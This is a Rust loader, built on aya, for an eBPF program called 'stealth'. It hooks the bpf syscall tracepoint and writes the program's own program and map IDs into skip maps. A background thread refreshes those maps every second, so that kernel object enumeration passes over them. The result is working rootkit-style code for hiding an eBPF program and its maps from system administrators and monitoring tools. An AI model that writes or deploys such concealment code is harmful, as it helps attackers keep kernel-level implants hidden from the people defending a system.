use std::{thread, time::Duration};

use aya::{maps::HashMap, programs::TracePoint};

#[rustfmt::skip]
use log::{debug, warn};
use clap::Parser;
use libbpf_rs::query::{MapInfoIter, ProgInfoIter};
use tokio::signal;

#[derive(Parser, Debug)]
#[command(version, about, about,long_about = None)]
pub struct Arg {
    #[clap(short, long,value_parser, value_delimiter = ' ', num_args = 1..)]
    pub prog: Option<Vec<u32>>,
}

#[inline]
fn list_active_programs() -> Vec<u32> {
    let iter = ProgInfoIter::default();
    let mut active_programs = Vec::<u32>::new();
    for prog in iter {
        active_programs.push(prog.id);
    }
    active_programs
}
#[inline]
fn list_active_maps() -> Vec<u32> {
    let iter = MapInfoIter::default();
    let mut active_maps = Vec::<u32>::new();
    for prog in iter {
        active_maps.push(prog.id);
    }
    active_maps
}
// bpf_obj_get_next_id(&attr, uattr.user,
//     &prog_idr, &prog_idr_lock)

// bpf_obj_get_next_id(__u32 start_id, __u32 *next_id, int cmd)
//     attr
// struct { /* anonymous struct used by BPF_*_GET_*_ID */
//     union {
//         __u32		start_id;
//         __u32		prog_id;
//         __u32		map_id;
//         __u32		btf_id;
//         __u32		link_id;
//     };
//     __u32		next_id;
//     __u32		open_flags;
// };

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root");
        std::process::exit(1);
    }

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.

    let mut ebpf = aya::Ebpf::load(aya::include_bytes_aligned!(concat!(
        env!("OUT_DIR"),
        "/stealth"
    )))?;
    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let program: &mut TracePoint = ebpf.program_mut("stealth_tracepoint").unwrap().try_into()?;
    program.load()?;
    program.attach("syscalls", "sys_enter_bpf")?;
    let prog_info = program.info().unwrap();
    let prog_id = prog_info.id();
    let mut prog_maps = prog_info.map_ids().unwrap().unwrap();
    prog_maps.sort();

    //setup HIDDEN_OBJ MAP  0:prog_ids 1:map_ids
    let mut hidden_obj_map: HashMap<_, u32, [u32; 32]> =
        HashMap::try_from(ebpf.take_map("HIDDEN_OBJ").unwrap()).unwrap();
    let mut hidden_progs = [0u32; 32];
    hidden_progs[0] = prog_id;
    let mut hidden_maps = [0u32; 32];
    for (idx, m) in prog_maps.iter().enumerate() {
        hidden_maps[idx] = *m
    }
    hidden_obj_map.insert(0, hidden_progs, 0).unwrap();
    hidden_obj_map.insert(1, hidden_maps, 0).unwrap();

    //setup skip MAPS
    let mut prog_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();
    let mut map_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("MAP_SKIP").unwrap()).unwrap();

    thread::spawn({
        move || loop {
            thread::sleep(Duration::from_millis(1000));
            let active_programs = list_active_programs();
            let mut prev_id: u32 = 0;
            for p in active_programs.into_iter() {
                if p == prog_id {
                    prog_skip_map.insert(prev_id, prog_id, 0).unwrap();
                    break;
                } else {
                    prev_id = p;
                }
            }

            let mut prev_id: u32 = 0;
            let active_maps = list_active_maps();
            let n_active_maps = active_maps.len();
            for (idx, m) in active_maps.iter().enumerate() {
                for to_skip_map in prog_maps.iter() {
                    if m == to_skip_map {
                        let to_insert_map_id: u32 = match idx < n_active_maps {
                            true => {
                                let mut id = *to_skip_map;
                                for next_id in active_maps.as_slice()[idx..].into_iter() {
                                    if !prog_maps.contains(next_id) {
                                        id = *next_id;
                                        break;
                                    }
                                }
                                id
                            }
                            false => *to_skip_map,
                        };

                        map_skip_map.insert(prev_id, to_insert_map_id, 0).unwrap();
                        break;
                    }
                }
                prev_id = *m;
            }
        }
    });
    let ctrl_c = signal::ctrl_c();
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");
    Ok(())
}
